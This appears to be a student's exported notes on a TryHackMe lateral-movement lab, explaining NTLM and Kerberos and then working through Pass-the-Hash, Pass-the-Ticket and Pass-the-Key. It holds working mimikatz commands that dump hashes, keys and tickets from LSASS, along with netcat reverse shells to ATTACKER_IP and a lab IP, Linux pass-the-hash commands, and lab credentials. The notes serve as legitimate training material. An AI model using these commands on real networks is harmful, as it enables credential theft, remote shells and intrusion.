<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Alternate Authentication</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Alternate Authentication</h1><br/><p><strong><h1>Use oF Alternate Authentication Material</h1></strong></p><p></p><p></p><p>By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user&#39;s password itself. This is possible because of how some authentication protocols used by Windows networks work. In this task, we will take a look at a couple of alternatives available to log as a user when either of the following authentication protocols is available on the network:</p><p></p><p>    ▪ NTLM authentication</p><p>    ▪ Kerberos authentication</p><p></p><p>Note: During this task, you are assumed to be familiar with the methods and tools to extract credentials from a host. Mimikatz will be used as the tool of choice for credential extraction throughout the room.</p><p></p><p></p><p><strong><h2>NTLM Authentication</h2></strong></p><p></p><p>Before diving into the actual lateral movement techniques, let&#39;s take a look at how NTLM authentication works:</p><p></p><p><img src="images/339-1.png" alt="images/339-1.png" /></p><p></p><p><strong>Steps</strong></p><p>    1. The client sends an authentication request to the server they want to access.</p><p>    2. The server generates a random number and sends it as a challenge to the client.</p><p>    3. The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.</p><p>    4. The server forwards both the challenge and the response to the Domain Controller for verification.</p><p>    5. The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.</p><p>    6. The server forwards the authentication result to the client.</p><p></p><p><strong>Note:</strong> The described process applies when using a domain account. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored <strong>locally</strong> on its <strong>SAM</strong>.</p><p></p><p><strong><h3>Pass-the-Hash(PtH)</h3></strong></p><p></p><p>As a result of extracting credentials from a host where we have attained administrative privileges (by using mimikatz or similar tools), we might get clear-text passwords or hashes that can be easily cracked. However, if we aren&#39;t lucky enough, we will end up with non-cracked NTLM password hashes.</p><p></p><p>Although it may seem we can&#39;t really use those hashes, the NTLM challenge sent during authentication can be responded to just by knowing the password hash. This means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.</p><p></p><p>To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.</p><p></p><p><strong>A) Extracting NTLM hashes from local SAM:</strong></p><p></p><p>This method will only allow you to get hashes from local users on the machine. No domain user&#39;s hashes will be available.</p><p><img src="images/339-2.png" alt="images/339-2.png" /></p><p></p><p>mimikatz # <strong>privilege::debug</strong></p><p>mimikatz # <strong>token::elevate</strong></p><p>mimikatz # <strong>lsadump::sam</strong></p><p></p><p></p><p><strong>B) Extracting NTLM hashes from LSASS memory:</strong></p><p></p><p>This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.</p><p><img src="images/339-3.png" alt="images/339-3.png" /></p><p></p><p>mimikatz # <strong>privilege::debug</strong></p><p>mimikatz # <strong>token::elevate</strong></p><p>mimikatz # <strong>sekurlsa::msv</strong></p><p></p><p>We can then use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:</p><p></p><p>mimikatz # <strong>token::revert</strong></p><p>mimikatz # <strong>sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;</strong></p><p></p><p></p><p><strong>Notice</strong> we used <strong>token::revert</strong> to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won&#39;t work. </p><p></p><p>This would be the equivalent of using <strong>runas /netonly</strong> but with a <strong>hash</strong> instead of a <strong>password</strong> and will spawn a new reverse shell from where we can launch any command as the victim user.</p><p></p><p>To receive the reverse shell, we should run a reverse listener on our AttackBox:</p><p>AttackBox</p><p></p><p><strong>nc -lvp 5555</strong></p><p>  </p><p><strong>Interestingly</strong>, if you run the <strong>whoami</strong> command on this shell, it will still show you the <strong>original user</strong> you were using <strong>before</strong> doing <strong>PtH</strong>, but any <strong>command</strong> run from here will <strong>actually</strong> <strong>use</strong> the <strong>credentials we injected using PtH.</strong></p><p></p><p><strong><h3>Passing the Hash(PtH) Using Linux:</h3></strong></p><p></p><p>If you have access to a linux box (like your AttackBox), several tools have built-in support to perform PtH using different protocols. Depending on which services are available to you, you can do the following:</p><p></p><p><strong>Connect to RDP using PtH:</strong></p><p><em>xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH</em></p><p></p><p><strong>Connect via psexec using PtH:</strong></p><p><em>psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP</em></p><p><strong></strong></p><p><strong>Note:</strong> Only the linux version of psexec support PtH.</p><p></p><p><strong>Connect to WinRM using PtH:</strong></p><p><em>evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</em></p><p></p><p></p><p></p><p><strong><h2>Kerberos authentication</h2></strong></p><p></p><p>Let&#39;s have a quick look at how Kerberos authentication works on Windows networks:</p><p></p><p>    1. The user sends his username and a timestamp encrypted using a key derived from his password to the Key Distribution Center (KDC), a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.</p><p></p><p>    The KDC will create and send back a <strong>Ticket Granting Ticket (TGT)</strong>, allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a <strong>Session Key</strong> is given to the user, which they will need to generate the requests that follow.</p><p></p><p>    <strong>Notice</strong> the TGT is encrypted using the <strong>krbtgt</strong> account&#39;s password hash, so the user can&#39;t access its contents. It is important to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.</p><p>    </p><p>    <img src="images/339-4.png" alt="images/339-4.png" /></p><p>    </p><p>    2. When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a <strong>Ticket Granting Service (TGS)</strong>. TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the user will send his username and a timestamp encrypted using the Session Key, along with the TGT and a Service Principal Name (SPN), which indicates the service and server name we intend to access.</p><p></p><p>	As a result, the KDC will send us a TGS and a <strong>Service Session Key</strong>, which we will need to authenticate to the service we want to access. The TGS is encrypted using the <strong>Service Owner Hash</strong>. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.</p><p></p><p>	<img src="images/339-5.png" alt="images/339-5.png" /></p><p>	</p><p>	3. The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account&#39;s password hash to decrypt the TGS and validate the Service Session Key.</p><p>	</p><p>	<img src="images/339-6.png" alt="images/339-6.png" /></p><p>	</p><p></p><p><strong><h3>Pass-the-Ticket(PtT)</h3></strong></p><p></p><p>Sometimes it will be possible to extract <strong>Kerberos</strong> <strong>tickets</strong> and <strong>session</strong> <strong>keys</strong> from <strong>LSASS</strong> memory using <strong>mimikatz</strong>. The process usually requires us to have <strong>SYSTEM privileges</strong> on the <strong>attacked</strong> machine and can be done as follows:</p><p></p><p>mimikatz # <strong>privilege::debug</strong></p><p>mimikatz # <strong>sekurlsa::tickets /export</strong></p><p></p><p><strong>Notice</strong> that if we only had access to a <strong>ticket</strong> but not its corresponding <strong>session key</strong>, we wouldn&#39;t be able to use that ticket; therefore, <strong>both</strong> <strong>are</strong> <strong>necessary</strong>.</p><p></p><p>While mimikatz can extract any <strong>TGT</strong> or <strong>TGS</strong> available from the memory of the <strong>LSASS</strong> process, most of the time, we&#39;ll be interested in <strong>TGTs</strong> as they can be used to request access to any services the user is allowed to access. At the same time, <strong>TGSs</strong> are only good for a specific service. Extracting <strong>TGTs</strong> will require us to have <strong>administrator&#39;s credentials</strong>, and extracting <strong>TGSs</strong> can be done with a <strong>low-privileged account</strong> (only the ones assigned to that account).</p><p></p><p>Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:</p><p></p><p>mimikatz # <strong>kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi</strong></p><p></p><p>Injecting tickets in our own session doesn&#39;t require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the <strong>klist</strong> command:</p><p></p><p><img src="images/339-7.png" alt="images/339-7.png" /></p><p></p><p><strong>Note:</strong> We need to exit from mimikatz to check the above. Then in the CMD we can run <strong>winrs.exe</strong> to connect to the <strong>Remote Server</strong> with the ticket in the session.</p><p></p><p><strong>winrs.exe -r:THMIIS.za.tryhackme.com cmd</strong></p><p></p><p><strong><h3>Overpass-the-hash(OPtH) / Pass-the-Key(PtK)</h3></strong></p><p></p><p>This kind of attack is similar to PtH but applied to Kerberos networks.</p><p></p><p>When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name <strong>Pass-the-key (PtK)</strong>.</p><p></p><p>We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:</p><p></p><p>mimikatz # <strong>privilege::debug</strong></p><p>mimikatz # <strong>sekurlsa::ekeys</strong></p><p></p><p>Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via <strong>Pass-the-Key</strong> (<strong>nc64</strong> is already available in THMJMP2 for your convenience):</p><p></p><p>If we have the <strong>RC4</strong> hash:</p><p></p><p>mimikatz # <strong>sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</strong></p><p></p><p>If we have the <strong>AES128</strong> hash:</p><p></p><p>mimikatz # <strong>sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</strong></p><p></p><p>If we have the <strong>AES256</strong> hash:</p><p></p><p>mimikatz # <strong>sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</strong></p><p></p><p><strong>Notice</strong> that when using <strong>RC4</strong>, the key will be equal to the <strong>NTLM</strong> hash of a user. This means that if we could extract the NTLM hash, we can use it to request a <strong>TGT</strong> as long as <strong>RC4</strong> is one of the enabled protocols. This particular variant is usually known as <strong>Overpass-the-Hash (OPtH)</strong>.</p><p></p><p>In the Reverse Shell Received, we will still be in the THMJMP2 Machine and be showing as old user. But we can run the following to Pivot into the server &amp; there the new username will be reflected.</p><p></p><p><strong>winrs.exe -r:THMIIS.za.tryhackme.com cmd</strong></p><p></p><p></p><p><strong><h2>Room Task</h2></strong></p><p></p><p>To begin this exercise, you will need to connect to THMJMP2 using the following credentials via SSH:</p><p></p><p><strong>User: ZA.TRYHACKME.COM\t2_felicia.dean</strong></p><p><strong>Password: iLov3THM!</strong></p><p></p><p><strong>ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com</strong></p><p></p><p>These credentials will grant you administrative access to THMJMP2, allowing you to use mimikatz to dump the authentication material needed to perform any of the techniques presented during this task.</p><p></p><p>Using your SSH session, use mimikatz to extract authentication material and perform <strong>Pass-the-Hash</strong>, <strong>Pass-the-Ticket</strong> or <strong>Pass-the-Key</strong> against domain user <strong>t1_toby.beck</strong>.</p><p></p><p>Once you have a command prompt with his credentials loaded, use winrs to connect to a command prompt on THMIIS. Since t1_toby.beck&#39;s credentials are already injected in your session as a result of any of the attacks, you can use winrs without specifying any credentials, and it will use the ones available to your current session:</p><p></p><p><strong>winrs.exe -r:THMIIS.za.tryhackme.com cmd</strong></p><p></p><p><strong><span style="text-decoration:underline;">A) Pass-the-Hash [PtH] (Practical)</span></strong></p><p></p><p><strong>privilege::debug</strong></p><p><strong>token::elevate</strong></p><p><strong>sekurlsa::msv</strong></p><p></p><p><img src="images/339-8.png" alt="images/339-8.png" /></p><p></p><p>Then, we search for our required user.</p><p></p><p><img src="images/339-9.png" alt="images/339-9.png" /></p><p></p><p>Start a Listener on Port <strong>5555</strong></p><p>Next, use this NTLM hash inside mimikatz to create a reverse connection.</p><p></p><p><strong>token::revert</strong></p><p><strong>sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:&quot;c:\tools\nc64.exe -e cmd.exe 10.50.67.27 5555&quot;</strong></p><p></p><p><img src="images/339-10.png" alt="images/339-10.png" /></p><p></p><p>In Our Listener,</p><p><img src="images/339-11.png" alt="images/339-11.png" /></p><p></p><p>We got a connection, however it shows as OLD user &amp; we are currently in the THMJMP2 machine. Lets use <strong>winrs.exe</strong></p><p></p><p><strong>winrs.exe -r:THMIIS.za.tryhackme.com cmd</strong></p><p></p><p>It will take the user&#39;s authentication from memory.</p><p><img src="images/339-12.png" alt="images/339-12.png" /></p><p></p><p>Thus, we have successfully pivoted to the server as user t1_toby.beck.</p><p></p><p></p><p><strong><span style="text-decoration:underline;">B) Pass-the-Key [PtK]/Overpass-the-Hash (Practical)</span></strong></p><p></p><p>(<strong>OPtH</strong>) is described when we use <strong>rc4</strong> encryption.</p><p>However, i will use <strong>aes256</strong> (<strong>PtK</strong>)</p><p></p><p><strong>privilege::debug</strong></p><p><strong>sekurlsa::ekeys</strong></p><p></p><p><img src="images/339-13.png" alt="images/339-13.png" /></p><p></p><p>Next, we find our target user.</p><p><img src="images/339-14.png" alt="images/339-14.png" /></p><p></p><p><strong>Note:</strong> I also tired rc4 key. It also works the same way as per its syntax in the theory above.</p><p></p><p>Start a Listener on Port <strong>5556</strong></p><p>Then, use this <strong>aes256</strong> encryption key for reverse connection.</p><p>In Mimikatz:</p><p></p><p><strong>sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:&quot;c:\tools\nc64.exe -e cmd.exe 10.50.67.27 5556&quot;</strong></p><p></p><p><img src="images/339-15.png" alt="images/339-15.png" /></p><p></p><p>In Our Listener,</p><p></p><p><img src="images/339-16.png" alt="images/339-16.png" /></p><p></p><p>We got a connection, however it shows as OLD user &amp; we are currently in the THMJMP2 machine. Lets use <strong>winrs.exe</strong></p><p></p><p><strong>winrs.exe -r:THMIIS.za.tryhackme.com cmd</strong></p><p></p><p>It will take the user&#39;s authentication from memory.</p><p><img src="images/339-17.png" alt="images/339-17.png" /></p><p></p><p>Thus, we have successfully pivoted to the server as user t1_toby.beck.</p><p></p><p></p><p><strong><span style="text-decoration:underline;">C) Pass-the-Ticket (Practical)</span></strong></p><p></p><p><strong>privilege::debug</strong></p><p><strong>sekurlsa::tickets /export</strong></p><p></p><p></p><p><img src="images/339-18.png" alt="images/339-18.png" /></p><p></p><p>Next, we search for our IIS server (if any ticket is available)</p><p><img src="images/339-19.png" alt="images/339-19.png" /></p><p></p><p>Lets import the ticket.</p><p></p><p><strong>kerberos::ptt [0;16a8b22]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi</strong></p><p></p><p>Next, exit out of mimikatz.exe &amp; run klist to verify if ticket was added successfully.</p><p></p><p><img src="images/339-20.png" alt="images/339-20.png" /></p><p></p><p>As our ticket is added to the session, We can directly run <strong>winrs.exe</strong> to get into <strong>IIS</strong> <strong>Server</strong> with the user <strong>t1_toby.beck</strong></p><p></p><p><img src="images/339-21.png" alt="images/339-21.png" /></p><p></p><p>Thus, we have successfully pivoted to the server as user t1_toby.beck.</p></div>
</body>
</html>
